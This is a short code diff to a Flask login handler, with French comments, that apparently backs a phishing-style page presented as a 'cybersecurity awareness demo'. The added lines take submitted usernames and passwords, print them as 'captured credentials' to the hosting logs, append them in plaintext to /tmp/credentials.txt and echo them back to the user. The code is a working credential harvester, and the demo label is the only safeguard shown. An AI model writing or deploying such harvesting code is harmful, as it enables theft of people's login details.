@@ -7,12 +7,15 @@ def submit():
     username = request.form['username']
     password = request.form['password']
     
-    # Sauvegarde dans un fichier (sur Netlify, le système de fichiers est éphémère)
-    with open('credentials.txt', 'a') as f:
+    # 👇 CECI APPARAÎTRA DANS LES LOGS NETLIFY
+    print(f"🔴 IDENTIFIANTS CAPTURÉS : Username = {username}, Password = {password}")
+    
+    # Optionnel : on garde l'écriture dans un fichier (même si ça ne sert à rien sur Netlify)
+    with open('/tmp/credentials.txt', 'a') as f:  # /tmp/ est le seul dossier accessible en écriture
         f.write(f'Username: {username}, Password: {password}\n')
     
-    return 'Login successful! (This is a cybersecurity awareness demo)'
+    # Pour la démo, on peut aussi afficher les identifiants dans la réponse (le bandeau rouge prévient déjà)
+    return f'Login successful! (Démo pédagogique - Identifiants reçus : {username}/{password})'
 
-# Point d'entrée pour le développement local
 if __name__ == '__main__':
     app.run(port=8000)
